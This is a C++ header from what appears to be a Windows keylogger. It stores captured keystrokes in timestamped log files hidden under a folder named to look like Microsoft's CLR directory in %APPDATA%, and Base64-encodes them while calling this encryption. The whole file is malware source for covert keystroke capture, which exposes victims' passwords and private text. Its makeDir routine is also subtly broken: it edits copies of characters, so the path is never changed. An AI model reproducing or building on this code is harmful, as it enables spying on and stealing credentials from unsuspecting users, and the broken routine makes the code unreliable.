#pragma once
#ifndef IO_H
#define IO_H

#include <string>
#include <Windows.h>
#include <fstream>
#include "DateTime.h"
#include "Base64.h"
#include <sstream>

namespace IO {
	std::string getDirectoryPath(bool append_separator = false) {
		/*get enviroment variable*/
		char* buffer{};
		size_t sz{};
		std::string appdata_dir{};
		if (_dupenv_s(&buffer, &sz, "APPDATA") == 0 && buffer) {
			appdata_dir = buffer;
			free(buffer);
		}
		std::string full_path = appdata_dir + "\\Microsoft\\CLR";
		return  full_path + (append_separator ? "\\" : "");
	}
	bool makeOneDir(std::string& path) {
		return CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}
	/*creates entire directory (multiple folders)*/
	bool makeDir(std::string& path) {
		for (auto c : path) {
			if (c == '\\') {
				c = '\0';
				if (!makeOneDir(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}
	/*log key strokes*/
	template<typename T>
	std::string writeKeyLog(const T& source) {
		std::string path{ getDirectoryPath(true) };
		/*set log file name to current date and time*/
		Utilities::DateTime dt;
		std::string name = dt.getDateTimeString("_") + ".log";
		try {
			std::ofstream file(path + name);
			/*unable to create file*/
			if (!file)
				return "";
			std::ostringstream out;
			/*time stamp plus key strokes captured*/
			out << "[" << dt.getDateTimeString() << "]\n" << source << '\n';
			/*encrypt data*/
			std::string data{ Base64::encryptBase64(out.str()) };
			/*push data to file*/
			file << data;
			/*unable to write to file*/
			if (!file)
				return "";
			file.close();
			return name;
		}
		catch (...) {
			return "";
		}
	}
	/*log app activity: time started, whether it succeeded or not*/
	void writeAppLog(const std::string& source) {
		std::ofstream file("AppLog.txt", std::ios::app);
		file << "[" << Utilities::DateTime().getDateTimeString() << "]\n" << source << '\n';
		file.close();
	}
}

#endif